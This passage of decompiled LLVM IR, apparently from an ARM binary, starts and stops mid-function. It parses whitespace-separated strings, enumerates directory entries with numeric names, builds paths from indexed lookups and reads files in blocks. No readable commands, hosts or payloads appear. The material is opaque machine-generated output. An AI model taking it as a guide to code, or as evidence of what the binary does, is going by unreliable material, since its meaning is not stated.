  br i1 %v2_ca3c, label %dec_label_pc_cbc4.loopexit, label %dec_label_pc_ca44

dec_label_pc_ca84:                                ; preds = %dec_label_pc_ca7c
  %v1_ca88 = add i32 %v1_caa8, 2
  %v2_ca90 = add i32 %v1_ca88, %v2_ca8c
  %v1_ca94 = add i32 %v2_ca90, -545
  %v2_ca94 = inttoptr i32 %v1_ca94 to i8*
  %v3_ca94 = load i8, i8* %v2_ca94, align 1
  %v2_ca98 = icmp eq i8 %v3_ca94, 0
  br i1 %v2_ca98, label %bb129, label %bb128

bb128:                                            ; preds = %dec_label_pc_ca84
  %v8_ca9c = icmp eq i8 %v3_ca94, 32
  br i1 %v8_ca9c, label %.thread13, label %dec_label_pc_caa8

.thread13:                                        ; preds = %bb128
  store i32 %v1_ca88, i32* @r5, align 4
  br label %dec_label_pc_cac8

bb129:                                            ; preds = %dec_label_pc_ca84
  store i32 %v1_ca88, i32* @r5, align 4
  br label %dec_label_pc_cac8

dec_label_pc_caa8:                                ; preds = %bb128
  %v0_caa8 = load i32, i32* @r6, align 4
  %v2_caa8 = add i32 %v0_caa8, %v1_caa8
  br label %dec_label_pc_cab0

dec_label_pc_cab0:                                ; preds = %bb130, %dec_label_pc_caa8
  %v0_cabc16 = phi i32 [ %v1_cabc, %bb130 ], [ %v1_ca88, %dec_label_pc_caa8 ]
  %v0_cac018 = phi i32 [ %v1_cac0, %bb130 ], [ %v2_caa8, %dec_label_pc_caa8 ]
  %v1_cab0 = add i32 %v0_cac018, 3
  %v2_cab0 = inttoptr i32 %v1_cab0 to i8*
  %v3_cab0 = load i8, i8* %v2_cab0, align 1
  %v2_cab4 = icmp eq i8 %v3_cab0, 0
  br i1 %v2_cab4, label %.thread15, label %bb130

.thread15:                                        ; preds = %dec_label_pc_cab0
  %v1_cabc17 = add i32 %v0_cabc16, 1
  store i32 %v1_cabc17, i32* @r5, align 4
  br label %dec_label_pc_cac8

bb130:                                            ; preds = %dec_label_pc_cab0
  %v8_cab8 = icmp eq i8 %v3_cab0, 32
  %v1_cabc = add i32 %v0_cabc16, 1
  store i32 %v1_cabc, i32* @r5, align 4
  %v1_cac0 = add i32 %v0_cac018, 1
  br i1 %v8_cab8, label %dec_label_pc_cac8, label %dec_label_pc_cab0

dec_label_pc_cac8:                                ; preds = %bb130, %bb129, %.thread15, %.thread13
  %v1_cad4 = phi i32 [ %v1_cabc17, %.thread15 ], [ %v1_ca88, %.thread13 ], [ %v1_ca88, %bb129 ], [ %v1_cabc, %bb130 ]
  %v0_cac8 = load i32, i32* @r6, align 4
  %v2_cac8 = add i32 %v0_cac8, %v1_ca88
  store i32 %v2_cac8, i32* @r4, align 4
  %v2_cad4 = add i32 %v1_cad4, %v2_ca8c
  store i32 0, i32* @r7, align 4
  %v3_cadc = add i32 %v2_cad4, -545
  %v4_cadc = inttoptr i32 %v3_cadc to i8*
  store i8 0, i8* %v4_cadc, align 1
  %v0_cae0 = load i32, i32* @r4, align 4
  %v1_cae4 = inttoptr i32 %v0_cae0 to i8*
  %v2_cae4 = call i32 @function_1084c(i8* %v1_cae4)
  store i32 %v2_cae4, i32* @r1, align 4
  %v0_caf0 = load i32, i32* @r4, align 4
  %v3_caf4 = inttoptr i32 %v0_caf0 to i8*
  %v4_caf4 = call i32 @function_10b9c(i8* %v3_caf4, i32 %v2_cae4, i32 %v2_c9bc)
  %v7_caf8 = icmp eq i32 %v4_caf4, -1
  br i1 %v7_caf8, label %dec_label_pc_ca2c.backedge, label %dec_label_pc_cb14.preheader

dec_label_pc_cb14.preheader:                      ; preds = %dec_label_pc_cac8
  %v1_cafc = load i32, i32* @r7, align 4
  %v1_cb00 = load i32, i32* @r6, align 4
  %v2_cb00 = load i32, i32* @r5, align 4
  %v3_cb00 = add i32 %v2_cb00, %v1_cb00
  store i32 %v1_cafc, i32* @lr, align 4
  %v1_cb1448 = add i32 %v3_cb00, 2
  %v2_cb1449 = inttoptr i32 %v1_cb1448 to i8*
  %v3_cb1450 = load i8, i8* %v2_cb1449, align 1
  %v2_cb1852 = icmp eq i8 %v3_cb1450, 0
  %v1_cb1c54 = add i32 %v2_cb00, 2
  br i1 %v2_cb1852, label %dec_label_pc_cb4c, label %dec_label_pc_cb24

dec_label_pc_cb24:                                ; preds = %dec_label_pc_cb14.preheader, %dec_label_pc_cb14.backedge
  %v0_cb4c83 = phi i32 [ %v0_cb4c81, %dec_label_pc_cb14.backedge ], [ %v1_cafc, %dec_label_pc_cb14.preheader ]
  %v0_cb34.pr = phi i32 [ %v0_cb34.pr70, %dec_label_pc_cb14.backedge ], [ %v1_cafc, %dec_label_pc_cb14.preheader ]
  %v0_ce54 = phi i32 [ %v0_ce5473, %dec_label_pc_cb14.backedge ], [ %v1_cafc, %dec_label_pc_cb14.preheader ]
  %v0_cb1c78 = phi i32 [ %v1_cb1c, %dec_label_pc_cb14.backedge ], [ %v1_cb1c54, %dec_label_pc_cb14.preheader ]
  %v0_cb44 = phi i32 [ %v0_cb14, %dec_label_pc_cb14.backedge ], [ %v3_cb00, %dec_label_pc_cb14.preheader ]
  %v1_cb28.in = phi i8 [ %v3_cb14, %dec_label_pc_cb14.backedge ], [ %v3_cb1450, %dec_label_pc_cb14.preheader ]
  %v7_cb24 = icmp eq i8 %v1_cb28.in, 9
  br i1 %v7_cb24, label %bb132, label %bb131

bb131:                                            ; preds = %dec_label_pc_cb24
  %v8_cb28 = icmp eq i8 %v1_cb28.in, 32
  br i1 %v8_cb28, label %.thread27, label %dec_label_pc_cb34

.thread27:                                        ; preds = %bb131
  br label %dec_label_pc_cb40

bb132:                                            ; preds = %dec_label_pc_cb24
  br label %dec_label_pc_cb40

dec_label_pc_cb34:                                ; preds = %bb131
  %v7_cb34 = icmp eq i32 %v0_cb34.pr, 1
  br i1 %v7_cb34, label %dec_label_pc_ce54, label %dec_label_pc_cb3c

dec_label_pc_cb3c:                                ; preds = %dec_label_pc_ce54, %dec_label_pc_cb34
  %v0_cb4075 = phi i32 [ %v1_ce54, %dec_label_pc_ce54 ], [ %v0_ce54, %dec_label_pc_cb34 ]
  br label %dec_label_pc_cb40

dec_label_pc_cb40:                                ; preds = %bb132, %.thread27, %dec_label_pc_cb3c
  %v0_cb40 = phi i32 [ %v0_ce54, %.thread27 ], [ %v0_ce54, %bb132 ], [ %v0_cb4075, %dec_label_pc_cb3c ]
  %v0_cb34.pr71 = phi i32 [ 1, %.thread27 ], [ 1, %bb132 ], [ 0, %dec_label_pc_cb3c ]
  %v7_cb48 = icmp sgt i32 %v0_cb40, 6
  br i1 %v7_cb48, label %dec_label_pc_cb4c, label %dec_label_pc_cb14.backedge

dec_label_pc_cb4c:                                ; preds = %dec_label_pc_cb14.backedge, %dec_label_pc_cb40, %dec_label_pc_cb14.preheader
  %v1_cb9c = phi i32 [ %v1_cb1c54, %dec_label_pc_cb14.preheader ], [ %v1_cb1c, %dec_label_pc_cb14.backedge ], [ %v0_cb1c78, %dec_label_pc_cb40 ]
  %v0_cb4c = phi i32 [ %v1_cafc, %dec_label_pc_cb14.preheader ], [ %v0_cb4c81, %dec_label_pc_cb14.backedge ], [ %v0_cb4c83, %dec_label_pc_cb40 ]
  %v2_cb4c = icmp eq i32 %v0_cb4c, 0
  br i1 %v2_cb4c, label %dec_label_pc_ca2c.backedge, label %dec_label_pc_cb58

dec_label_pc_cb58:                                ; preds = %dec_label_pc_cb4c
  %v2_cb60 = add i32 %v1_cb9c, %v2_ca8c
  %v1_cb64 = add i32 %v2_cb60, -545
  %v2_cb64 = inttoptr i32 %v1_cb64 to i8*
  %v3_cb64 = load i8, i8* %v2_cb64, align 1
  %v2_cb68 = icmp eq i8 %v3_cb64, 0
  br i1 %v2_cb68, label %dec_label_pc_cb98, label %bb133

bb133:                                            ; preds = %dec_label_pc_cb58
  %v8_cb6c = icmp eq i8 %v3_cb64, 32
  br i1 %v8_cb6c, label %dec_label_pc_cb98, label %dec_label_pc_cb74

dec_label_pc_cb74:                                ; preds = %bb133
  %v2_cb74 = add i32 %v1_cb9c, %v1_cb00
  br label %dec_label_pc_cb78

dec_label_pc_cb78:                                ; preds = %bb134, %dec_label_pc_cb74
  %v0_cb8430 = phi i32 [ %v1_cb84, %bb134 ], [ %v1_cb9c, %dec_label_pc_cb74 ]
  %v0_cb78 = phi i32 [ %v1_cb78, %bb134 ], [ %v2_cb74, %dec_label_pc_cb74 ]
  %v1_cb78 = add i32 %v0_cb78, 1
  %v2_cb78 = inttoptr i32 %v1_cb78 to i8*
  %v3_cb78 = load i8, i8* %v2_cb78, align 1
  %v2_cb7c = icmp eq i8 %v3_cb78, 0
  br i1 %v2_cb7c, label %.thread29, label %bb134

.thread29:                                        ; preds = %dec_label_pc_cb78
  %v1_cb8431 = add i32 %v0_cb8430, 1
  br label %dec_label_pc_cb8c

bb134:                                            ; preds = %dec_label_pc_cb78
  %v8_cb80 = icmp eq i8 %v3_cb78, 32
  %v1_cb84 = add i32 %v0_cb8430, 1
  br i1 %v8_cb80, label %dec_label_pc_cb8c, label %dec_label_pc_cb78

dec_label_pc_cb8c:                                ; preds = %bb134, %.thread29
  %v1_cb94 = phi i32 [ %v1_cb8431, %.thread29 ], [ %v1_cb84, %bb134 ]
  %v2_cb94 = add i32 %v1_cb94, %v2_ca8c
  br label %dec_label_pc_cb98

dec_label_pc_cb98:                                ; preds = %dec_label_pc_cb58, %bb133, %dec_label_pc_cb8c
  %v2_cba4 = phi i32 [ %v2_cb60, %dec_label_pc_cb58 ], [ %v2_cb60, %bb133 ], [ %v2_cb94, %dec_label_pc_cb8c ]
  %v2_cb9c = add i32 %v1_cb9c, %v1_cb00
  store i32 %v2_cb9c, i32* @r4, align 4
  %v3_cba4 = add i32 %v2_cba4, -545
  %v4_cba4 = inttoptr i32 %v3_cba4 to i8*
  store i8 0, i8* %v4_cba4, align 1
  %v1_cba8 = inttoptr i32 %v2_cb9c to i8*
  %v2_cba8 = call i32 @function_1084c(i8* %v1_cba8)
  %v8_cbb0 = icmp sgt i32 %v2_cba8, 15
  br i1 %v8_cbb0, label %dec_label_pc_ca2c.backedge, label %dec_label_pc_cbb4

dec_label_pc_cbb4:                                ; preds = %dec_label_pc_cb98
  %v0_cbb8 = load i32, i32* @r4, align 4
  %v2_cbbc = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_cbbc, i32* @r0, align 4
  %v2_cbc0 = bitcast i32* %stack_var_-56 to i8*
  %v3_cbc0 = call i32 @function_10874(i8* %v2_cbc0, i32 %v0_cbb8)
  br label %dec_label_pc_cbc4

dec_label_pc_cbc4.loopexit:                       ; preds = %dec_label_pc_ca2c.backedge, %dec_label_pc_ca2c.preheader
  %.pre = ptrtoint i32* %stack_var_-56 to i32
  %.pre92 = bitcast i32* %stack_var_-56 to i8*
  br label %dec_label_pc_cbc4

dec_label_pc_cbc4:                                ; preds = %dec_label_pc_cbc4.loopexit, %dec_label_pc_cbb4
  %v1_cbd4.pre-phi = phi i8* [ %.pre92, %dec_label_pc_cbc4.loopexit ], [ %v2_cbc0, %dec_label_pc_cbb4 ]
  %v2_cbd0.pre-phi = phi i32 [ %.pre, %dec_label_pc_cbc4.loopexit ], [ %v2_cbbc, %dec_label_pc_cbb4 ]
  %v0_cbc4 = load i32, i32* @r8, align 4
  %v1_cbc8 = call i32 @function_1130c(i32 %v0_cbc4)
  %v2_cbd4 = call i32 @function_1084c(i8* %v1_cbd4.pre-phi)
  store i32 %v2_cbd4, i32* @r4, align 4
  %v2_cbd8 = icmp eq i32 %v2_cbd4, 0
  br i1 %v2_cbd8, label %dec_label_pc_ce80, label %dec_label_pc_cbe0

dec_label_pc_cbe0:                                ; preds = %dec_label_pc_cbc4
  %v3_cbe8 = call i32 @function_10248(i32 13, i32* null)
  %v1_cbec = call i32 @function_11508(i32 %v3_cbe8)
  store i32 %v1_cbec, i32* @sb, align 4
  %v2_cbf0 = icmp eq i32 %v1_cbec, 0
  br i1 %v2_cbf0, label %dec_label_pc_ce20, label %dec_label_pc_cc00.preheader

dec_label_pc_cc00.preheader:                      ; preds = %dec_label_pc_cbe0
  store i32 0, i32* @r5, align 4
  %v1_cc0443 = inttoptr i32 %v1_cbec to i32*
  %v2_cc0444 = call i32 @function_1164c(i32* %v1_cc0443)
  %v2_cc0846 = icmp eq i32 %v2_cc0444, 0
  br i1 %v2_cc0846, label %dec_label_pc_ce14, label %dec_label_pc_cc10.preheader

dec_label_pc_cc00.loopexit:                       ; preds = %dec_label_pc_cc18, %dec_label_pc_cc28, %dec_label_pc_cc94
  %v0_cc00 = load i32, i32* @sb, align 4
  %v1_cc04 = inttoptr i32 %v0_cc00 to i32*
  %v2_cc04 = call i32 @function_1164c(i32* %v1_cc04)
  %v2_cc08 = icmp eq i32 %v2_cc04, 0
  br i1 %v2_cc08, label %dec_label_pc_ce14, label %dec_label_pc_cc10.preheader

dec_label_pc_cc10.preheader:                      ; preds = %dec_label_pc_cc00.preheader, %dec_label_pc_cc00.loopexit
  %v0_cc1891 = phi i32 [ %v2_cc04, %dec_label_pc_cc00.loopexit ], [ %v2_cc0444, %dec_label_pc_cc00.preheader ]
  br label %dec_label_pc_cc10

dec_label_pc_cc10:                                ; preds = %dec_label_pc_cc10.preheader, %dec_label_pc_cdfc
  %v0_cc30 = phi i32 [ %v0_cc1891, %dec_label_pc_cc10.preheader ], [ %v2_ce08, %dec_label_pc_cdfc ]
  %v0_cc10 = load i32, i32* @r5, align 4
  %v2_cc10 = icmp eq i32 %v0_cc10, 0
  br i1 %v2_cc10, label %dec_label_pc_cc18, label %dec_label_pc_ce14

dec_label_pc_cc18:                                ; preds = %dec_label_pc_cc10
  %v1_cc18 = add i32 %v0_cc30, 11
  %v2_cc18 = inttoptr i32 %v1_cc18 to i8*
  %v3_cc18 = load i8, i8* %v2_cc18, align 1
  %v4_cc18 = zext i8 %v3_cc18 to i32
  %v1_cc1c = add nsw i32 %v4_cc18, -48
  %tmp = icmp ugt i32 %v1_cc1c, 9
  br i1 %tmp, label %dec_label_pc_cc00.loopexit, label %dec_label_pc_cc28

dec_label_pc_cc28:                                ; preds = %dec_label_pc_cc18
  store i32 %v1_cc18, i32* @r7, align 4
  %v3_cc34 = call i32 @function_10248(i32 13, i32* null)
  store i32 %v2_c994, i32* @r0, align 4
  %v3_cc40 = call i32 @function_10874(i8* %v2_c9b8, i32 %v3_cc34)
  %v2_cc48 = call i32 @function_1084c(i8* %v2_c9b8)
  %v0_cc4c = load i32, i32* @r7, align 4
  %v1_cc50 = load i32, i32* @sl, align 4
  %v2_cc50 = add i32 %v1_cc50, %v2_cc48
  store i32 %v2_cc50, i32* @r0, align 4
  %v2_cc54 = inttoptr i32 %v2_cc50 to i8*
  %v3_cc54 = call i32 @function_10874(i8* %v2_cc54, i32 %v0_cc4c)
  %v2_cc5c = call i32 @function_1084c(i8* %v2_c9b8)
  %v0_cc60 = load i32, i32* @r5, align 4
  store i32 %v2_cc5c, i32* @r4, align 4
  %v2_cc6c = inttoptr i32 %v0_cc60 to i32*
  %v3_cc6c = call i32 @function_10248(i32 14, i32* %v2_cc6c)
  %v0_cc74 = load i32, i32* @r4, align 4
  %v1_cc74 = load i32, i32* @sl, align 4
  %v2_cc74 = add i32 %v1_cc74, %v0_cc74
  store i32 %v2_cc74, i32* @r0, align 4
  %v2_cc78 = inttoptr i32 %v2_cc74 to i8*
  %v3_cc78 = call i32 @function_10874(i8* %v2_cc78, i32 %v3_cc6c)
  %v3_cc88 = call i32 @function_11070(i32 %v2_c994, i32 %v2_c984, i32 4096)
  %v7_cc8c = icmp eq i32 %v3_cc88, -1
  br i1 %v7_cc8c, label %dec_label_pc_cc00.loopexit, label %dec_label_pc_cc94

dec_label_pc_cc94:                                ; preds = %dec_label_pc_cc28
  %v0_cc94 = load i32, i32* @r5, align 4
  %v2_cc9c = inttoptr i32 %v0_cc94 to i32*
  %v3_cc9c = call i32 @function_10248(i32 13, i32* %v2_cc9c)
  store i32 %v2_c994, i32* @r0, align 4
  %v3_cca8 = call i32 @function_10874(i8* %v2_c9b8, i32 %v3_cc9c)
  %v2_ccb0 = call i32 @function_1084c(i8* %v2_c9b8)
  %v0_ccb4 = load i32, i32* @r7, align 4
  %v1_ccb8 = load i32, i32* @sl, align 4
  %v2_ccb8 = add i32 %v1_ccb8, %v2_ccb0
  store i32 %v2_ccb8, i32* @r0, align 4
  %v2_ccbc = inttoptr i32 %v2_ccb8 to i8*
  %v3_ccbc = call i32 @function_10874(i8* %v2_ccbc, i32 %v0_ccb4)
  %v2_ccc4 = call i32 @function_1084c(i8* %v2_c9b8)
  %v0_ccc8 = load i32, i32* @r5, align 4
  store i32 %v2_ccc4, i32* @r4, align 4
  %v2_ccd4 = inttoptr i32 %v0_ccc8 to i32*
  %v3_ccd4 = call i32 @function_10248(i32 15, i32* %v2_ccd4)
  %v0_ccdc = load i32, i32* @r4, align 4
  %v1_ccdc = load i32, i32* @sl, align 4
  %v2_ccdc = add i32 %v1_ccdc, %v0_ccdc
  store i32 %v2_ccdc, i32* @r0, align 4
  %v2_cce0 = inttoptr i32 %v2_ccdc to i8*
  %v3_cce0 = call i32 @function_10874(i8* %v2_cce0, i32 %v3_ccd4)
  %v1_cce8 = call i32 @function_11508(i32 %v2_c994)
  store i32 %v1_cce8, i32* @r8, align 4
  %v2_ccec = icmp eq i32 %v1_cce8, 0
  br i1 %v2_ccec, label %dec_label_pc_cc00.loopexit, label %dec_label_pc_ccf4.preheader

dec_label_pc_ccf4.preheader:                      ; preds = %dec_label_pc_cc94
  %v1_ccf838 = inttoptr i32 %v1_cce8 to i32*
  %v2_ccf839 = call i32 @function_1164c(i32* %v1_ccf838)
  store i32 %v2_ccf839, i32* @r6, align 4
  %v2_ccfc41 = icmp eq i32 %v2_ccf839, 0
  store i32 4096, i32* @r1, align 4
  store i32 %v2_c984, i32* @r0, align 4
  br i1 %v2_ccfc41, label %dec_label_pc_cdfc, label %dec_label_pc_cd0cthread-pre-split

dec_label_pc_ccf4.loopexit:                       ; preds = %dec_label_pc_cd14, %dec_label_pc_cdac
  %v0_ccf4 = load i32, i32* @r8, align 4
  %v1_ccf8 = inttoptr i32 %v0_ccf4 to i32*
  %v2_ccf8 = call i32 @function_1164c(i32* %v1_ccf8)
  store i32 %v2_ccf8, i32* @r6, align 4
  %v2_ccfc = icmp eq i32 %v2_ccf8, 0
  store i32 4096, i32* @r1, align 4
  store i32 %v2_c984, i32* @r0, align 4
  br i1 %v2_ccfc, label %dec_label_pc_cdfc, label %dec_label_pc_cd0cthread-pre-split

dec_label_pc_cd0cthread-pre-split:                ; preds = %dec_label_pc_ccf4.preheader, %dec_label_pc_ccf4.loopexit
  %v0_cd0c.pr = load i32, i32* @r5, align 4
  br label %dec_label_pc_cd0c

dec_label_pc_cd0c:                                ; preds = %dec_label_pc_cd0cthread-pre-split, %dec_label_pc_cdd4
  %v0_cd0c = phi i32 [ %v0_cd0c.pr, %dec_label_pc_cd0cthread-pre-split ], [ 1, %dec_label_pc_cdd4 ]
  %v2_cd0c = icmp eq i32 %v0_cd0c, 0
  br i1 %v2_cd0c, label %dec_label_pc_cd14, label %dec_label_pc_cdfc

dec_label_pc_cd14:                                ; preds = %dec_label_pc_cd0c
  %v0_cd14 = call i32 @function_108e0()
  %v0_cd18 = load i32, i32* @r5, align 4
  %v2_cd20 = inttoptr i32 %v0_cd18 to i32*
  %v3_cd20 = call i32 @function_10248(i32 13, i32* %v2_cd20)
  store i32 %v2_c994, i32* @r0, align 4
  %v3_cd2c = call i32 @function_10874(i8* %v2_c9b8, i32 %v3_cd20)
  %v2_cd34 = call i32 @function_1084c(i8* %v2_c9b8)
  %v0_cd38 = load i32, i32* @r7, align 4
  %v1_cd3c = load i32, i32* @sl, align 4
  %v2_cd3c = add i32 %v1_cd3c, %v2_cd34
  store i32 %v2_cd3c, i32* @r0, align 4
  %v2_cd40 = inttoptr i32 %v2_cd3c to i8*
  %v3_cd40 = call i32 @function_10874(i8* %v2_cd40, i32 %v0_cd38)
  %v2_cd48 = call i32 @function_1084c(i8* %v2_c9b8)
  %v0_cd4c = load i32, i32* @r5, align 4
  store i32 %v2_cd48, i32* @r4, align 4
  %v2_cd58 = inttoptr i32 %v0_cd4c to i32*
  %v3_cd58 = call i32 @function_10248(i32 15, i32* %v2_cd58)
  %v0_cd60 = load i32, i32* @r4, align 4
  %v1_cd60 = load i32, i32* @sl, align 4
  %v2_cd60 = add i32 %v1_cd60, %v0_cd60
  store i32 %v2_cd60, i32* @r0, align 4
  %v2_cd64 = inttoptr i32 %v2_cd60 to i8*
  %v3_cd64 = call i32 @function_10874(i8* %v2_cd64, i32 %v3_cd58)
  %v2_cd6c = call i32 @function_1084c(i8* %v2_c9b8)
  %v1_cd74 = load i32, i32* @sl, align 4
  %v2_cd74 = add i32 %v1_cd74, %v2_cd6c
  store i32 %v2_cd74, i32* @r0, align 4
  %v2_cd78 = inttoptr i32 %v2_cd74 to i8*
  %v3_cd78 = call i32 @function_10874(i8* %v2_cd78, i32 ptrtoint (i32* @global_var_1667c.57 to i32))
  %v2_cd80 = call i32 @function_1084c(i8* %v2_c9b8)
  %v0_cd84 = load i32, i32* @r6, align 4
  %v1_cd84 = add i32 %v0_cd84, 11
  %v1_cd88 = load i32, i32* @sl, align 4
  %v2_cd88 = add i32 %v1_cd88, %v2_cd80
  store i32 %v2_cd88, i32* @r0, align 4
  %v2_cd8c = inttoptr i32 %v2_cd88 to i8*
  %v3_cd8c = call i32 @function_10874(i8* %v2_cd8c, i32 %v1_cd84)
  %v3_cd9c = call i32 @function_11070(i32 %v2_c994, i32 %v2_c984, i32 4096)
  %v7_cda0 = icmp eq i32 %v3_cd9c, -1
  br i1 %v7_cda0, label %dec_label_pc_ccf4.loopexit, label %dec_label_pc_cdac

dec_label_pc_cdac:                                ; preds = %dec_label_pc_cd14
  %v2_cdac = call i32 @function_1084c(i8* %v2_c9a4)
  store i32 %v2_cdac, i32* @r1, align 4
  %v4_cdc0 = call i32 @function_10b9c(i8* %v2_c9a4, i32 %v2_cdac, i32 %v2_cbd0.pre-phi)
  %v7_cdc4 = icmp eq i32 %v4_cdc0, -1
  br i1 %v7_cdc4, label %dec_label_pc_ccf4.loopexit, label %dec_label_pc_cdd4

dec_label_pc_cdd4:                                ; preds = %dec_label_pc_cdac
  %v0_cdcc = load i32, i32* @r7, align 4
  %v2_cdd4 = inttoptr i32 %v0_cdcc to i8*
  %v3_cdd4 = call i32 @function_10970(i8* %v2_cdd4, i32 10)
  %v2_cddc = call i32 @function_110d8(i32 %v3_cdd4, i32 9)
  %v0_cde0 = load i32, i32* @r8, align 4
  %v1_cde4 = inttoptr i32 %v0_cde0 to i32*
  %v2_cde4 = call i32 @function_1164c(i32* %v1_cde4)
  store i32 %v2_cde4, i32* @r6, align 4
  %v2_cde8 = icmp eq i32 %v2_cde4, 0
  store i32 1, i32* @r5, align 4
  store i32 4096, i32* @r1, align 4
  store i32 %v2_c984, i32* @r0, align 4
  br i1 %v2_cde8, label %dec_label_pc_cdfc, label %dec_label_pc_cd0c

dec_label_pc_cdfc:                                ; preds = %dec_label_pc_ccf4.loopexit, %dec_label_pc_cdd4, %dec_label_pc_cd0c, %dec_label_pc_ccf4.preheader
  %v0_cdfc = load i32, i32* @r8, align 4
  %v1_ce00 = inttoptr i32 %v0_cdfc to i32*
  %v2_ce00 = call i32 @function_11340(i32* %v1_ce00)
  %v0_ce04 = load i32, i32* @sb, align 4
  %v1_ce08 = inttoptr i32 %v0_ce04 to i32*
  %v2_ce08 = call i32 @function_1164c(i32* %v1_ce08)
  %v2_ce0c = icmp eq i32 %v2_ce08, 0
  br i1 %v2_ce0c, label %dec_label_pc_ce14, label %dec_label_pc_cc10

dec_label_pc_ce14:                                ; preds = %dec_label_pc_cc00.loopexit, %dec_label_pc_cdfc, %dec_label_pc_cc10, %dec_label_pc_cc00.preheader
  %v0_ce14 = load i32, i32* @sb, align 4
  %v1_ce18 = inttoptr i32 %v0_ce14 to i32*
  %v2_ce18 = call i32 @function_11340(i32* %v1_ce18)
  %v0_ce1c = load i32, i32* @r5, align 4
  %v1_ce1c = urem i32 %v0_ce1c, 256
  br label %dec_label_pc_ce20

dec_label_pc_ce20:                                ; preds = %dec_label_pc_cbe0, %dec_label_pc_ce14
  %storemerge = phi i32 [ %v1_ce1c, %dec_label_pc_ce14 ], [ 0, %dec_label_pc_cbe0 ]
  store i32 %storemerge, i32* @r4, align 4
  %v1_ce24 = call i32 @function_133f8(i32 1)
  %v1_ce2c = call i32 @function_1026c(i32 13)
  %v1_ce34 = call i32 @function_1026c(i32 14)
  %v1_ce3c = call i32 @function_1026c(i32 15)
  br label %dec_label_pc_ce40

dec_label_pc_ce40:                                ; preds = %bb, %dec_label_pc_ce80, %dec_label_pc_ce20
  %v0_ce40 = load i32, i32* @r4, align 4
  store i32 %v3_c93c, i32* @r4, align 4
  store i32 %v6_c93c, i32* @r5, align 4
  store i32 %v9_c93c, i32* @r6, align 4
  store i32 %v12_c93c, i32* @r7, align 4
  store i32 %v15_c93c, i32* @r8, align 4
  store i32 %v18_c93c, i32* @sb, align 4
  store i32 %v21_c93c, i32* @sl, align 4
  store i32 %v24_c93c, i32* @fp, align 4
  store i32 %v27_c93c, i32* @lr, align 4
  ret i32 %v0_ce40

dec_label_pc_ce54:                                ; preds = %dec_label_pc_cb34
  %v1_ce54 = add i32 %v0_ce54, 1
  %v7_ce58 = icmp eq i32 %v0_ce54, 0
  br i1 %v7_ce58, label %dec_label_pc_ce60, label %dec_label_pc_cb3c

dec_label_pc_ce60:                                ; preds = %dec_label_pc_ce54
  %v1_ce60 = add i32 %v0_cb44, 3
  %v2_ce60 = inttoptr i32 %v1_ce60 to i8*
  %v3_ce60 = load i8, i8* %v2_ce60, align 1
  %v7_ce64 = icmp eq i8 %v3_ce60, 65
  br i1 %v7_ce64, label %dec_label_pc_ce78, label %dec_label_pc_ce6c

dec_label_pc_ce6c:                                ; preds = %dec_label_pc_ce60, %dec_label_pc_ce78
  %v0_cb4c82 = phi i32 [ %v0_cb4c83, %dec_label_pc_ce60 ], [ 1, %dec_label_pc_ce78 ]
  br label %dec_label_pc_cb14.backedge

dec_label_pc_cb14.backedge:                       ; preds = %dec_label_pc_ce6c, %dec_label_pc_cb40
  %v0_cb4c81 = phi i32 [ %v0_cb4c82, %dec_label_pc_ce6c ], [ %v0_cb4c83, %dec_label_pc_cb40 ]
  %v0_ce5473 = phi i32 [ %v1_ce54, %dec_label_pc_ce6c ], [ %v0_cb40, %dec_label_pc_cb40 ]
  %v0_cb34.pr70 = phi i32 [ 0, %dec_label_pc_ce6c ], [ %v0_cb34.pr71, %dec_label_pc_cb40 ]
  %v0_cb14 = add i32 %v0_cb44, 1
  %v1_cb14 = add i32 %v0_cb44, 3
  %v2_cb14 = inttoptr i32 %v1_cb14 to i8*
  %v3_cb14 = load i8, i8* %v2_cb14, align 1
  %v2_cb18 = icmp eq i8 %v3_cb14, 0
  %v1_cb1c = add i32 %v0_cb1c78, 1
  br i1 %v2_cb18, label %dec_label_pc_cb4c, label %dec_label_pc_cb24

dec_label_pc_ce78:                                ; preds = %dec_label_pc_ce60
  store i32 1, i32* @lr, align 4
  br label %dec_label_pc_ce6c

dec_label_pc_ce80:                                ; preds = %dec_label_pc_cbc4
  %v1_ce84 = call i32 @function_1026c(i32 13)
  %v1_ce8c = call i32 @function_1026c(i32 14)
  %v1_ce94 = call i32 @function_1026c(i32 15)
  %v1_ce9c = call i32 @function_1026c(i32 17)
  br label %dec_label_pc_ce40

dec_label_pc_cea4:                                ; preds = %dec_label_pc_c93c
  store i8 48, i8* %stack_var_-72, align 1
  br label %dec_label_pc_c9e8

; uselistorder directives
  uselistorder i32 %v1_cb1c, { 1, 0 }
  uselistorder i8 %v3_cb14, { 1, 0 }
  uselistorder i32 %v0_cb4c81, { 1, 0 }
  uselistorder i32 %v1_ce54, { 1, 0 }
  uselistorder i32 %v2_ce08, { 1, 0 }
  uselistorder i32 %v1_cb78, { 1, 0 }
  uselistorder i32 %v0_cb8430, { 1, 0 }
  uselistorder i32 %v1_cb9c, { 0, 3, 1, 2 }
  uselistorder i32 %v0_cb40, { 1, 0 }
  uselistorder i32 %v0_cb1c78, { 1, 0 }
  uselistorder i32 %v0_ce54, { 4, 3, 0, 1, 2 }
  uselistorder i32 %v0_cb4c83, { 1, 2, 0 }
  uselistorder i32 %v1_cb1c54, { 1, 0 }
  uselistorder i32 %v2_cb00, { 1, 0 }
  uselistorder i32 %v1_cafc, { 3, 1, 0, 2, 4 }
  uselistorder i32 %v1_cabc, { 0, 2, 1 }
  uselistorder i32 %v0_cabc16, { 1, 0 }
  uselistorder i32 %v1_ca88, { 0, 2, 3, 4, 5, 6, 1 }
  uselistorder i32 %v2_ca18, { 1, 2, 0 }
  uselistorder i32 %v0_c9c0, { 1, 0 }
  uselistorder i32 %v2_c9bc, { 1, 0, 2 }
  uselistorder i8* %v2_c9a4, { 1, 0, 2 }
  uselistorder i32 %v2_c984, { 1, 2, 3, 0, 4, 5 }
  uselistorder i8* %stack_var_-585, { 1, 4, 0, 2, 3 }
  uselistorder i8* %stack_var_-72, { 2, 0, 1 }
  uselistorder i32* %stack_var_-56, { 0, 1, 2, 4, 3 }
  uselistorder i32 (i8*, i32, i32)* @function_10aac, { 1, 0 }
  uselistorder label %dec_label_pc_ce6c, { 1, 0 }
  uselistorder label %dec_label_pc_ce40, { 1, 2, 0 }
  uselistorder label %dec_label_pc_ce20, { 1, 0 }
  uselistorder label %dec_label_pc_ce14, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_cdfc, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_cd0c, { 1, 0 }
